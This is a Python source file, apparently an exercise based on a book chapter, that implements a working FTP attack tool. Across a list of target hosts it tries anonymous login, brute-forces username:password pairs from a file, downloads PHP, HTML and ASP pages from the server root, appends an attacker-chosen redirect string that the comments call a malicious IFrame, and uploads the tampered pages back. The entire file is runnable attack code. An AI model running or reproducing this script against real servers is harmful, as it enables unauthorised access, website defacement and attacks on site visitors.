# A FPT brute force login script, based on chapter 2.
# Python 3.4

"""
    Now an attack script on FTP server which recovers specified files and inject any string defined by the user.
    For each host in the targets file, this script does:

        1 - Tries to connect as a anonymous user, if successful, goes to 3, if not, 2:
        2 - Tries to connect as one of the user:password from password file, if successful, goes to 3.
        3 - Search in the directory for files with extension php, htm or asp and retrieve any finding.
        4 - Injects the "redirect" string defined, in each file.
        5 - Uploads the tampered file back to the host without change it name.

"""

import ftplib
import argparse


# Function for anonymous login. Per default, a new ftp installation comes with anonymous user enabled.
def anon_login(hostname):

    try:

        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous', 'anon@ymous.com')
        print("[+] FTP anonymous login successful on - {0}".format(hostname))
        ftp.quit()
        return True

    except Exception as error:

        print("[+] FTP anonymous login failed on - {0}".format(hostname))
        return False


# For each host, try every user:password combination until a valid login be found  or exhaust the possibilities.
def brute_force(hostname, password_file):

    with open(password_file, 'r') as passwords:

        for line in passwords.readlines():

            user_name = line.split(':')[0]
            password = line.split(':')[1].strip('\r').strip('\n')
            print("[-] Testing login with: {0}/{1}".format(user_name, password))

            try:

                ftp = ftplib.FTP(hostname)
                ftp.login(user_name, password)
                print("[+] Successful login on {0} with {1}/{2}".format(hostname, user_name, password))
                ftp.quit()
                return user_name,password

            except Exception as error:

                pass

        print("Could not connect with any of given usernames:passwords")
        return None,None


# List the files on root dir and return those with extension php, htm or asp.
def returnDefault(ftp):

    try:

        dir_list = ftp.nlst()

    except:

        dir_list = []
        print("[-] Could not list directory contents.")
        print("[-] Skipping to next target.")
        return

    ret_list = []

    for filename in dir_list:

        fn = filename.lower()

        if '.php' in fn or '.htm' in fn or '.asp' in fn:

            print("[+] Found default page {0}".format(filename))
            ret_list.append(filename)

    return ret_list


# FTP file injection. Downloads the files sent by returnDefault, inject the string and return it.
def injectPage(ftp, page, redirect):

    try:

        file = open(page + '.tmp', 'w')
        ftp.retrlines('RETR ' + page, file.write)
        print("[+] Downloaded page: {0}".format(page))
        file.write(redirect)
        file.close()
        print("[+] Injected malicious IFrame on {0}".format(page))
        ftp.storbinary('STOR ' + page, open(page + '.tmp'))
        print("Uploaded injected page {0}".format(page))

    except:

        print("[-] Unable to inject IFrame, skipping file {0}.".format(page))
        pass


# Wrap the attack together.
def attack(username, password, tgtHost, redirect):

    ftp = ftplib.FTP(tgtHost)
    ftp.login(username, password)
    defPages = returnDefault(ftp)

    for defPage in defPages:

        injectPage(ftp, defPage, redirect)


def main():

    # Defines the options and the help menu.
    parser = argparse.ArgumentParser(description="Python FTP attack script")
    parser.add_argument('Target_File', help="File with target hosts, one per line.")
    parser.add_argument("-p", "--pwd", help="File with user:password, one per line.")
    parser.add_argument('Redirect', help="Specify the redirection page.")

    # Receives the arguments sent by the user.
    args = parser.parse_args()
    targetFile = args.Target_File
    password_file = args.pwd
    redirect = args.Redirect

    # If target file is not set, prints the help menu from argparse and exits.
    if targetFile is None or redirect is None:
        print(parser.usage)
        exit(0)

    # Open targe file as read only.
    with open(targetFile, 'r') as hosts:

        for tgtHost in hosts.readlines():

            # Set username and password null before starts the attack.
            username = None
            password = None
            tgtHost = tgtHost.strip('\r').strip('\n')

            # If anonymous login is successful, starts the attack.
            if anon_login(tgtHost) is True:

                username = 'anonymous'
                password = 'anon@ymous.com'

                print("[+] Using anonymous credentials to access {0}".format(tgtHost))
                attack(username, password, tgtHost, redirect)

            # If password file was set, uses it for brute force the FTP server.
            elif password_file != None:

                (username, password) = brute_force(tgtHost, password_file)

            # If the brute force attack returns a valid password, starts the attack.
            if password != None:

                print("[+] Using credentials {0}:{1}".format(username, password))
                attack(username, password, tgtHost, redirect)


if __name__ == '__main__':
    main()